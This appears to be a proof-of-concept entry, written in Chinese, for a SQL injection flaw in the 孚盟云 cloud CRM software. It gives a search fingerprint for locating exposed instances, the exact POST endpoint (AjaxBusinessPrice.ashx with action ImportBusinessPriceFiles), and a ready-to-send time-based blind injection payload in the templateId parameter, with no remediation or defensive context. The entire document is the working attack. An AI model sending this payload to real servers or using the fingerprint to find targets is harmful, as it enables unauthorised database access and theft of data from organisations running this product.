# 孚盟云ImportBusinessPriceFiles存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/AjaxBusinessPrice.ashx HTTP/1.1`

**Payload**
```
action=ImportBusinessPriceFiles&templateId=1%27AND+%28SELECT+4920+FROM+%28SELECT%28SLEEP%285%29%29%29ILaK%29--+-&Fid=1&type=1
```
- **响应特征**：200